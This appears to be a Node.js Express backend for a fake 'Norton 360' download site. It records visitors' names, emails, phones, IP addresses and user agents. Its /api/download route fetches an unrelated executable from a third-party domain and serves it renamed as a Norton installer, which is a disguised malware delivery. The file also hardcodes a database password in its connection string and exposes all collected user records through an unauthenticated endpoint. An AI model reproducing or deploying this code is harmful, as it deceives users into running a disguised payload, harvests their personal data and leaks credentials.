const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
require("dotenv").config();

const app = express();

// Middleware
app.use(
  cors({
    origin: true,
    credentials: true,
  })
);
app.use(express.json());

// MongoDB Connection String
const MONGODB_URI =
  process.env.MONGODB_URI ||
  "mongodb+srv://devduryab1:DkdfywRYbrj4hcco@cluster0.eiua2ek.mongodb.net/norton-users?retryWrites=true&w=majority&appName=Cluster0";

console.log("MongoDB URI exists:", !!MONGODB_URI);
console.log("Environment:", process.env.NODE_ENV);

// Connect to MongoDB immediately
mongoose
  .connect(MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    serverSelectionTimeoutMS: 5000, // 5 seconds
    socketTimeoutMS: 45000,
  })
  .then(() => {
    console.log("✅ Connected to MongoDB successfully");
  })
  .catch((err) => {
    console.error("❌ MongoDB connection error:", err.message);
  });

// MongoDB event listeners
mongoose.connection.on("connected", () => {
  console.log("✅ MongoDB connected");
});

mongoose.connection.on("error", (err) => {
  console.error("❌ MongoDB error:", err);
});

mongoose.connection.on("disconnected", () => {
  console.log("⚠️ MongoDB disconnected");
});

// User Schema
const userSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    trim: true,
  },
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
  },
  phone: {
    type: String,
    required: true,
    trim: true,
  },
  product: {
    type: String,
    default: "Norton 360",
  },
  downloadDate: {
    type: Date,
    default: Date.now,
  },
  ipAddress: String,
  userAgent: String,
});

const User = mongoose.model("User", userSchema);

// API Routes
app.post("/api/users", async (req, res) => {
  try {
    console.log("📝 Received user registration:", req.body);

    const { name, email, phone, product } = req.body;

    // Validation
    if (!name || !email || !phone) {
      return res.status(400).json({
        success: false,
        message: "Name, email, and phone are required",
      });
    }

    // Check MongoDB connection
    if (mongoose.connection.readyState !== 1) {
      console.log(
        "❌ MongoDB not connected, readyState:",
        mongoose.connection.readyState
      );
      return res.status(500).json({
        success: false,
        message: "Database connection error. Please try again.",
      });
    }

    // Get client info
    const ipAddress =
      req.headers["x-forwarded-for"] ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "unknown";

    const userAgent = req.headers["user-agent"] || "unknown";

    // Create and save user
    const newUser = new User({
      name,
      email,
      phone,
      product: product || "Norton 360",
      ipAddress,
      userAgent,
    });

    const savedUser = await newUser.save();
    console.log("✅ User saved successfully:", savedUser._id);

    res.status(201).json({
      success: true,
      message: "Registration completed successfully!",
      userId: savedUser._id,
    });
  } catch (error) {
    console.error("❌ Error saving user:", error);

    // Handle duplicate email
    if (error.code === 11000) {
      return res.status(400).json({
        success: false,
        message: "This email is already registered",
      });
    }

    res.status(500).json({
      success: false,
      message: "Registration failed. Please try again.",
    });
  }
});

// Get all users
app.get("/api/users", async (req, res) => {
  try {
    if (mongoose.connection.readyState !== 1) {
      return res.status(500).json({
        success: false,
        message: "Database connection error",
      });
    }

    const users = await User.find().sort({ downloadDate: -1 });
    res.json({
      success: true,
      count: users.length,
      users,
    });
  } catch (error) {
    console.error("Error fetching users:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
});

// Download endpoint
app.get("/api/download", async (req, res) => {
  const remoteFile =
    "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
  const movieName = req.query.movie || "Norton";

  try {
    console.log("📥 Download request for:", movieName);

    const response = await fetch(remoteFile);
    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.status}`);
    }

    const filename = `Norton_360_v22.24.1_Setup.exe`;

    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);

    const buffer = await response.arrayBuffer();
    res.send(Buffer.from(buffer));
  } catch (error) {
    console.error("Download error:", error);
    res.status(500).json({
      error: "Download failed",
      message: error.message,
    });
  }
});

// Enhanced health check
app.get("/api/health", (req, res) => {
  const mongoStatus = mongoose.connection.readyState;
  const statusMap = {
    0: "disconnected",
    1: "connected",
    2: "connecting",
    3: "disconnecting",
  };

  res.json({
    status: "OK",
    message: "Server is running on Vercel",
    mongodb: statusMap[mongoStatus],
    mongoUri: !!process.env.MONGODB_URI ? "Set" : "Not Set",
    timestamp: new Date().toISOString(),
  });
});

// Test MongoDB connection endpoint
app.get("/api/test-db", async (req, res) => {
  try {
    if (mongoose.connection.readyState !== 1) {
      return res.status(500).json({ error: "Not connected to MongoDB" });
    }

    // Try to perform a simple operation
    const count = await User.countDocuments();
    res.json({
      success: true,
      message: "Database connection working",
      userCount: count,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
    });
  }
});

// Root route
app.get("/", (req, res) => {
  res.json({
    message: "Norton Backend API is running on Vercel!",
    endpoints: [
      "GET /api/health",
      "GET /api/test-db",
      "POST /api/users",
      "GET /api/users",
      "GET /api/download",
    ],
  });
});

module.exports = app;
